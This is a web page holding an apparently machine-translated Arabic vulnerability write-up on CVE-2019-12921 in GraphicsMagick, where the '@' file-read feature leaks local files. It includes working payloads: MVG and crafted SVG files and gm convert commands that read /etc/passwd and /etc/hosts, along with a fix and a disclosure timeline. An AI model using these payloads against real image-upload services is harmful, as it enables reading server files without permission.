<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>๐๐ผ ๐ค๐ฝ ๐จ๐พโ๐ป ุงููุฃุณุงุฉ ูุง ุชุฃุชู ูุญุฏูุง โ๏ธ ๐ ๐</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ูู ุนุงู 2016 ุ ุชุณุจุจุช ุซุบุฑุฉ ImageTragick ูู ImageMagick ูู ูุซูุฑ ูู ุงูุถูุถุงุก. ููุณููุฉ ููุญุฏ ูู ุงููุฎุงุทุฑ ุ ุชู ุงูุชุฑุงุญ ุงุณุชุฎุฏุงู GraphicsMagick ุ ููู ููุชุฑู ููุชุจุฉ I...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ุงููุฃุณุงุฉ ูุง ุชุฃุชู ูุญุฏูุง</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/wrike/blog/458926/" style=";text-align:right;direction:rtl"><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/cq/qt/va/cqqtvacmffwgveolv8ci-cebioo.png"></div><br><p style=";text-align:right;direction:rtl">  ูู ุนุงู 2016 ุ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุชุณุจุจุช</a> ุซุบุฑุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ImageTragick</a> ูู ImageMagick ูู ูุซูุฑ ูู ุงูุถูุถุงุก.  ููุณููุฉ ููุญุฏ ูู ุงููุฎุงุทุฑ ุ ุชู ุงูุชุฑุงุญ ุงุณุชุฎุฏุงู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">GraphicsMagick</a> ุ ููู ููุชุฑู ููุชุจุฉ ImageMagick ุ โโููุฏู ุฅูู ูุงุฌูุฉ ุจุฑูุฌุฉ ุชุทุจููุงุช ุฃูุซุฑ ุงุณุชูุฑุงุฑูุง ูุฅูุชุงุฌูุฉ.  ุชุณูุญ ูุดููุฉ ุนุฏู ุงูุญุตุงูุฉ ุงูุฃุตููุฉ CVE-2016-3717 ุ ุงูุชู ุงูุชุดููุง <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">stewie</a> ุ ููููุงุฌู ุจูุฑุงุกุฉ ููู ุชุนุณูู ุนูู ูุธุงู ุงููููุงุช ุจุงุณุชุฎุฏุงู ุตูุฑุฉ ุชู ุฅุนุฏุงุฏูุง ุฎุตูุตูุง.  ุงูููู ุณุฃูุธุฑ ูู ูุดููุฉ ุนุฏู ุญุตุงูุฉ ููุงุซูุฉ ูู ุจุฑูุงูุฌ GraphicsMagick ุงูุชู ุงูุชุดูุชูุง ุฃุซูุงุก ุชุญููู ุงูููุฏ ุงููุตุฏุฑู ููููุชุจุฉ. </p><a name="habracut"></a><br><p style=";text-align:right;direction:rtl">  ูู ูุนูู ุงูุงุณุชุบูุงู ุงูุฃุตูู ูู ุฎูุงู "ุงูุชุณููุฉ" ุงูุฎุงุตุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุจุงูุจุฑูุชูููู ุงูุฒุงุฆู ูู</a> ูููุน <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ImageTragick</a> . </p><br><pre style=";text-align:right;direction:rtl"><code class="plaintext hljs">push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'label:@/etc/passwd' pop graphic-context</code> </pre> <br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/pi/uy/pe/piuypewlfgrjyxsnz82hbpvk8ne.gif"></p><br><p style=";text-align:right;direction:rtl">  ุงูุณุจุจ ูู ุฃู ุฎูุงุฑุฒููุฉ ูุนุงูุฌุฉ ุงูุตูุฑ ImagePrimitive ุงูุฎุงุตุฉ ุจููู render.c ReadImage ูุง ูููููุง ูุนุงูุฌุฉ ุณูุณูุฉ ุงูุชุณููุฉ: @ / etc / passwd ูุตูุฑุฉ ูุณูู ุชูุฑุฌุน ุฎุทุฃ "ุชุนุฐุฑ ูุชุญ ุงูููู".  ุฑูุฒ ุงููุธููุฉ: </p><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">define</span></span></span><span class="hljs-meta"> VALID_PREFIX(str,url) (LocaleNCompare(str,url,sizeof(str)-1) == 0) </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta"> (!VALID_PREFIX(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"http://"</span></span></span><span class="hljs-meta">, primitive_info-&gt;text) &amp;&amp; !VALID_PREFIX(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"https://"</span></span></span><span class="hljs-meta">, primitive_info-&gt;text) &amp;&amp; !VALID_PREFIX(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"ftp://"</span></span></span><span class="hljs-meta">, primitive_info-&gt;text) &amp;&amp; !(IsAccessibleNoLogging(primitive_info-&gt;text)) ) { ThrowException(&amp;image-&gt;exception,FileOpenError,UnableToOpenFile,primitive_info-&gt;text); status=MagickFail; }</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ููุน ุฐูู ุ ุชุธู ุงููุฏุฑุฉ ุนูู ูุฑุงุกุฉ ุฃู ุตูุฑุฉ ุนูู ูุธุงู ุงููููุงุช ุ ูููู ูููู ุงุณุชุฎุฏุงููุง ููุท ูุฌูุน ุงููุนูููุงุช ุงูุฏุงุฎููุฉ.  ูููู ุงูุนุซูุฑ ุนูู ูุซุงู ูุชุดุบูู ูุฐู "ุงูููุฒุฉ" ูู ุชูุงุฑูุฑ ุจุฑุงูุฌ BugBounty ุ ุนูู ุณุจูู ุงููุซุงู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููุง</a> . <br>  ูุฐุง ูุงุฏูู ุฅูู ุฏุฑุงุณุฉ ุจุงูุชูุตูู ุชูููุฐ ุจุฑูุงูุฌ ุงูุชุฑููุฒ Label ูู GraphicsMagick.  ููููุงู ุจุฐูู ุ ูููู ุจุฅุฌุฑุงุก ุงูุชุญููู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">$ gm convert label:@etc/passwd output.png</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุชููู ุงูููุชุจุฉ ุจุฅุฑุฌุงุน ุงูุณุทุฑ ุงูุฃูู ูู ุงูููู / etc / passwd ุ ููุง ูุนูู ุฃู ุงูุจุฑูุชูููู ุงูุฒุงุฆู ูุง ูุฒุงู ุถุนูููุง ุ ููู ูู ูุนุธู ุงูุญุงูุงุช ูุง ูููู ููุงุณุจูุง ููููุงุฌููู ุ ุญูุซ ูุง ุชูุฌุฏ ุฅููุงููุฉ ููุชุฃุซูุฑ ุนูู ุณุทุฑ ุงูุฃูุงูุฑ.  ูููู ููู ููููู ุงุณุชุบูุงู ูุฐู "ุงูููุฒุฉ" ุ ุฏุนููุง ูููู ูุธุฑุฉ ุนูู ุงูุฃุณุจุงุจ.  ูุญูู ุงูุจุฑูุชูููู ุงูุฒุงุฆู ุงูุชุณููุฉ ุณูุณูุฉ ุจุงุณุชุฎุฏุงู ุฏุงูุฉ TranslateTextEx: </p><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">text=(<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *) formatted_text; <span class="hljs-comment"><span class="hljs-comment">/* If text starts with '@' then try to replace it with the content of the file name which follows. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((*text == <span class="hljs-string"><span class="hljs-string">'@'</span></span>) &amp;&amp; IsAccessible(text+<span class="hljs-number"><span class="hljs-number">1</span></span>)) { text=(<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *) FileToBlob(text+<span class="hljs-number"><span class="hljs-number">1</span></span>,&amp;length,&amp;image-&gt;exception); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (text == (<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *) <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>((<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *) <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>); }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุชูุจู ุงูุฏุงูุฉ ูุนููุฉ ุงูุฅุฏุฎุงู formatted_text ูุฅุฐุง ูุงู ุงูุณุทุฑ ูุจุฏุฃ ุจุงูุญุฑู ุงูุฎุงุต '@' ุ ูุณููุธุฑ GM ุฅูู ุงูุณุทุฑ ุงูุขุฎุฑ ุนูู ุฃูู ุงููุณุงุฑ ุงููุงูู ููููู ุงูุฐู ูู ุงูุถุฑูุฑู ูุฑุงุกุฉ ูุญุชููุงุช ุงูุชุญููู ููู.  ููููู ูุธุฑุฉ ุนูู ุงูุฃูุงูู ุงูุฃุฎุฑู ุงูุชู ุชูุณุชุฎุฏู ูููุง ูุฐู ุงููุธููุฉ ุ ูุงูุชู ูููู ุงุณุชุบูุงููุง ุจูุงุณุทุฉ ุงูููุงุฌู. </p><br><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  /coders/msl.c ุนุจุงุฑุฉ ุนู ุนุฏุฏ ูุงูุฑ ูู ุงูุชูุฑุงุฑุงุช ุ ููู ุฌูุฑุงู ููุชูุฑุฒ ุชุณุชุฎุฏู ูุฐู ุงููุบุฉ ููุบุฉ ูุตูุฉ ููุฃูุฑ conjure ููู ูุชู ุฃุฎุฐูุง ูู ุงูุงุนุชุจุงุฑ ูู ูุฐู ุงูููุงูุฉ. ุงูุนูููุฉ ููููุฉ ุ ูููููุง ุณุชุชุทูุจ ููุทููุง ูุญุฏุฏูุง ููุชุทุจูู </li><li style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl">  /magick/attribute.c ูุนุงูุฌุฉ ุณูุงุช ุงูุตูุฑ.  ูุชู ุงุณุชุฏุนุงุก ูุธููุฉ TranslateText ูุณูุงุช ุงูุชุนููู ูุงูุชุณููุฉ ุนูุฏูุง ูุชู ุชูุฑูุฑูุง ูุจุงุดุฑุฉ ูู ูุจู ุงููุณุชุฎุฏู ุ ุจุฏูุงู ูู ุชุฎุฒูููุง ูู ุงูุตูุฑุฉ ููุณูุง.  ุชุฑู ุงููุทูุฑ ููุง ูุตูุญุฉ ุตุบูุฑุฉ: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs"> Translate format requests in attribute text when the blob is not open. This is really gross since it is assumed that the attribute is supplied by the user and the user intends for translation to occur. However, 'comment' and 'label' attributes may also come from an image file and may contain arbitrary text. As a crude-workaround, translations are only performed when the blob is not open.</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูููู ูุงุฐุง ูุญุฏุซ ุฅุฐุง ุชู ุชูููุฐ ุงููุนุงูุฌุฉ ุจูุงุณุทุฉ ูุธููุฉ SetImageAttribute ููุตูุฑุฉ ุจุนุฏ ุนูุงูุฉ tog ุ ูุชู ุฅุบูุงู ุงูููุทุฉ.  ุงุชุถุญ ุฃู ููุงู ูุซู ูุฐุง ุงูุชุฑููุฒ - SVG.  ุณูุณูุฉ ุงูููุงููุงุช ุฅูู ุงูุฏุงูุฉ ReadSVGImage ูู ููุง ููู: </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ูุญูู XML ูุบูู </li><li style=";text-align:right;direction:rtl">  CloseBlob (ุตูุฑุฉ) ูุบูู ุงูููุทุฉ </li><li style=";text-align:right;direction:rtl">  ูููุถ MVG ูููุฐ ุงูุชุญููู </li><li style=";text-align:right;direction:rtl">  SetImageAttribute (ุตูุฑุฉ ุ "ุชุนููู" ุ svg_info.comment) ุณุชุชู ูุชุงุจุฉ ุณูุงุช ุงูุชุนููู ูุงูุนููุงู ุนูู ุงูุตูุฑุฉ. </li></ul><br></li></ol><br><p style=";text-align:right;direction:rtl">  ููุงุณุชุบูุงู ุงููุงุฌุญ ุ ูุญุชุงุฌ ุงูููุงุฌู ุฅูู ุงูุชูุณูู ุงูููุงุฆู ูุฏุนู ูุฐู ุงูุณูุงุช ุ ุนูู ุณุจูู ุงููุซุงู GIF ู JPEG. </p><br><pre style=";text-align:right;direction:rtl"> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--@/etc/passwd--&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"137px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"137px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">version</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"1.1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2000/svg"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xlink</span></span></span><span class="hljs-tag">= </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/1999/xlink"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">image</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xlink:href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">x</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">y</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100px"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">$ gm convert exploit.svg output.gif $ gm convert exploit.svg output.jpeg</code> </pre> <br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/6l/mx/m1/6lmxm1lvepbeyr9hgf3wbkompje.gif"></p><br><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ูุนุฏ /magick/annotate.c ูุง ููู ุฎูุงุฑูุง ุฌูุฏูุง ูุงุณุชุบูุงู ูุธููุฉ AnnotateImage ุงููุณุชุฎุฏูุฉ: <br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ูุดุจู /coders/txt.c ุจุฑูุชูููู TXT ูุจุฑูุชููููุงุช Lablel ุงููุฒููุฉ: ููู ุฃูุฑ ููุณ ูู ุฃูููุฉ ุฎุงุตุฉ ุ ูุธุฑูุง ูุฃู ุชุดุบููู ูุชุทูุจ ุงููุตูู ุฅูู ุณุทุฑ ุงูุฃูุงูุฑ. </li><li style=";text-align:right;direction:rtl">  /magick/render.c ูููุง ูุตู ุฅูู ุงุณุชุบูุงููุง ุงูููุงุฆู ูููุต <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Magick Vector Graphics</a> ุงูุจุฏุงุฆู ุ ูุงูุฐู ูุญุชูู ุนูู ุตูุบุฉ ุจุณูุทุฉ ุฅูู ุญุฏ ูุง: </li></ul></li></ol><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">text "text"</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุงูุนูููุฉ ุงููุงุฌุญุฉ ููููุฉ ุฅุฐุง ุจุฏุฃ ุงูุฎุท ุจุงูุญุฑู ุงูุฎุงุต '@'. </p><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">$ gm convert -size 800x900 xc:white -draw <span class="hljs-string"><span class="hljs-string">'text 20,30 "@/etc/hosts"'</span></span> foo.png</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุฐู ุงูุทุฑููุฉ ูุงุฏุฑุฉ ููุบุงูุฉ ูู ุชุทุจูู ุญูููู ุ ูููู ููุงู ุทุฑููุฉ ูุงุณุชุบูุงู ูุฐู ุงูุซุบุฑุฉ ุงูุฃูููุฉ ุจุงุณุชุฎุฏุงู ุงููููุถูู.  ุงููููุถ ูู ูุนุงูุฌ ุตูุฑ ุฎุงุฑุฌู ูุง ุชุฏุนู ุงูููุชุจุฉ ุชูุณููู.  ููุงู ุนุฏุฏ ูู ุจุฑุงูุฌ ุงูุชุฑููุฒ ุงูุชู ูุชู ุชุญููููุง ุฅูู ููู ูุคูุช ููุชู ุฅุฌุฑุงุก ูุฒูุฏ ูู ุงููุนุงูุฌุฉ ุจูุงุณุทุฉ ุงูุจุฑูุชูููู ุงูุฒุงุฆู MVG.  ููุง ุฐูุฑ ุณุงุจููุง ุ ูููู ุจุฑูุงูุฌ ุงูุชุฑููุฒ ูุฐุง ูู SVG. </p><br><h4 id="ekspluataciya-cve-2019-12921" style=";text-align:right;direction:rtl">  ุนูููุฉ CVE-2019-12921 </h4><br><p style=";text-align:right;direction:rtl">  ุตูุฑุฉ XML Parser SVG ุชุญูู ุงูุชุฑููุฒ ุฅูู ููู ูุณูุท: </p><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">FormatString(clone_info-&gt;filename,โmvg:%<span class="hljs-number"><span class="hljs-number">.1024</span></span>s<span class="hljs-string"><span class="hljs-string">",filename);</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุญุชูู ุชุญููู img tag ุนูู ุงูููุฏ ุงูุชุงูู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"> <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> <span class="hljs-string"><span class="hljs-string">'i'</span></span>: { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (LocaleCompare((<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *) name,<span class="hljs-string"><span class="hljs-string">"image"</span></span>) == <span class="hljs-number"><span class="hljs-number">0</span></span>) { MVGPrintf(svg_info-&gt;file,<span class="hljs-string"><span class="hljs-string">"image Copy %g,%g %g,%g '%s'\n"</span></span>, svg_info-&gt;bounds.x,svg_info-&gt;bounds.y,svg_info-&gt;bounds.width, svg_info-&gt;bounds.height,svg_info-&gt;url); MVGPrintf(svg_info-&gt;file,<span class="hljs-string"><span class="hljs-string">"pop graphic-context\n"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ููุงุณุชุบูุงู ุ ูุญุชุงุฌ ุฅูู ูุณุฑ ุณูุงู ุงูุณูุณูุฉ ุจุนูุงูุฉ ุงูุชุจุงุณ ูุนุชุงุฏุฉ ูุฅุถุงูุฉ ุงุณุชุบูุงููุง: </p><br><pre style=";text-align:right;direction:rtl"> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"720px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"720px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">version</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"1.1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2000/svg"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xlink</span></span></span><span class="hljs-tag">= </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/1999/xlink"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">image</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xlink:href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/etc/favicon.png' text 0,0 '@/etc/passwd"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">x</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">y</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"720px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"720px"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">$ gm convert exploit.svg output.png</code> </pre> <br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุงูุตูุฑุฉ ุงูููุงุฆูุฉ</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/9d/hn/ro/9dhnrotg3je3c4r7xqzesmfc0dc.png"></p></div></div><br><p style=";text-align:right;direction:rtl">  ุณูุชู ุชุดุบูู ุจุฑุงูุฌ ุงูุชุฑููุฒ ุงูุฃุฎุฑู ุงูุชู ุชุณุชุฎุฏู ูููุถ MVG ููููุง ูุชูุฏูุฑ ุงููุงุฑุฆ. </p><br><h4 id="zaschita" style=";text-align:right;direction:rtl">  ุญูุงูุฉ </h4><br><p style=";text-align:right;direction:rtl">  ูุชููุฑ ุฅุตุฏุงุฑ ูุญุฏุซ ูู GM ุนูู ูููุน ุงูุดุฑูุฉ ุงููุตูุนุฉ.  ุฅุตูุงุญ ูุฒูู ุฏุนู ุงููููุงุช ุจุงุณุชุฎุฏุงู ุงูุฑูุฒ @ ุงูุฎุงุต ูู ุงูููุช ุงูุญุงูู ุ Mercurial Chanets 16037: f780c290b4ab ู 16038: 44e3d0e872eb ููุธููุฉ TranslateTextEx.  ูููุง ูููุทูุฑูู ุ ูู ุงููุณุชูุจู ุ ุณูุชู ุฅุฑุฌุงุน ูุฐุง ุงูููุทู ูู ุชูููุฐ ุฃูุซุฑ ุฃููุง.  ูุญู ูุคูุช ุ ุชูุตุญ ุจุงุณุชุฎุฏุงู ูุชุบูุฑ ุงูุจูุฆุฉ MAGICK_CODER_STABILITY = PRIMARY </p><br><h4 id="timeline" style=";text-align:right;direction:rtl">  ุฌุฏูู ุฒููู </h4><br><p style=";text-align:right;direction:rtl">  ุชู ููู ูุนูููุงุช ุญูู ูุดููุฉ ุนุฏู ุงูุญุตุงูุฉ ุฅูู ุงููุทูุฑ ูู 6 ููููู 2019 ุ ุชู ุฅุตุฏุงุฑ ุฅุตูุงุญ ุนุงุฌู ูู ููุช ูุงุญู ูู ุฐูู ุงูููู.  ูู 15 ููููู 2019 ุ ุชู ูุดุฑ ุฎุทุงุจ ุฅุนูุงูู ุนูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">www.openwall.com</a> .  ูู 20 ููููู 2019 ุ ุชู ุชุนููู CVE-2019-12921 ููุฐู ุงููุดููุฉ. </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar458926/">https://habr.com/ru/post/ar458926/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar458916/index.html">ุชุญุช ุบุทุงุก ูุญุฑู ุงูุณูุงุฑุฉ ูู ุฑุฏ ุงููุนู. ููุชุจ ุชูููุฐูุง ูู ุงูุตูุฑ</a></li>
<li><a href="../ar458918/index.html">ูุง ูููู ุฃู ุชุชุนููู ูู ุชุตููู ุงูุฃูุนุงุจ ุบูุฑ ุงูุนุงุฏูุฉ</a></li>
<li><a href="../ar458920/index.html">ูุคุชูุฑ ููุญุจู DevOps</a></li>
<li><a href="../ar458922/index.html">ููููุฉ ุงูุงูุชูุงู ูู ESXi ุฅูู KVM / LXD ููุง ุชููุฏ ุนููู</a></li>
<li><a href="../ar458924/index.html">ุงูุญูุงุฏุซ ุชุณุงุนุฏู ุนูู ุงูุชุนูู</a></li>
